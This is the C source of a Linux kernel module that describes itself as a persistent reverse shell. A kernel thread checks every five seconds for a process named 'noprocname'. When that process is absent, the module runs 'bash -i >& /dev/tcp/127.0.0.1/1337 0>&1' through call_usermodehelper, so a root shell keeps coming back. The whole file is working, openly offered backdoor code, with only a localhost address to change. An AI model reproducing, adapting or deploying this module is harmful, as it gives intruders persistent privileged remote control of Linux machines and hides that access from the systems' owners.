#include <linux/init.h>         // Module initialization functions
#include <linux/module.h>       // Kernel module functions.
#include <linux/kernel.h>       // Basic kernel definitions, such as printk.
#include <linux/kthread.h>      // Thread management in the kernel.
#include <linux/delay.h>        // Delay functions, such as ssleep().
#include <linux/sched/signal.h> // Process management in the kernel.
#include <linux/string.h>       // For string functions like strlen() and strncmp().

MODULE_LICENSE("GPL");          
MODULE_AUTHOR("matheuzsec");          
MODULE_DESCRIPTION("Persistent Reverse Shell with Kernel Thread Monitoring and Uninterruptible Sleep");

struct task_struct *mon_thread; // Reference for the monitoring thread.
struct task_struct *task; // Structure used to represent tasks (processes) in the kernel.

int mon_shell(void *data) {     // Function that will be executed by the kernel thread (mon_thread).
    while (!kthread_should_stop()) {  // Checks if the thread should stop.
        bool process_found = false; // Flag to indicate if the process is found.
        
        // Scan all processes running in the system.
        for_each_process(task) {
            // Debugging: print process name and PID
            printk(KERN_INFO "Checking process: %s (PID: %d)\n", task->comm, task->pid);
            
            // Check if process name matches "noprocname"
            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true;  // Set flag if process is found.
                printk(KERN_INFO "Process 'noprocname' found (PID: %d)\n", task->pid);
                break;  // Exit the loop early if the process is found.
            }
        }
        
        if (!process_found) {
            // If the process named "noprocname" is not found, create a reverse shell.
            call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1", NULL}, 
                                NULL, UMH_WAIT_EXEC);

            printk(KERN_INFO "Executing reverse shell!\n");
        }
        
        ssleep(5);  // Waits 5 seconds before trying again.
    }
    return 0;  // Returns 0 when the thread finishes.
}

static int __init uninterruptible_sleep_init(void) {
    // Creates and runs the monitoring thread mon_shell.
    mon_thread = kthread_run(mon_shell, NULL, "matheuz");
    
    // Checks if the thread creation failed.
    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread);  // Returns the error.
    }
    
    printk(KERN_INFO "Monitoring started!\n");
    return 0;  // Returns 0 if the thread was successfully created.
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) { 
        kthread_stop(mon_thread);  // Stops the monitoring thread.
        printk(KERN_INFO "Monitoring stopped!\n");
    }
}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);
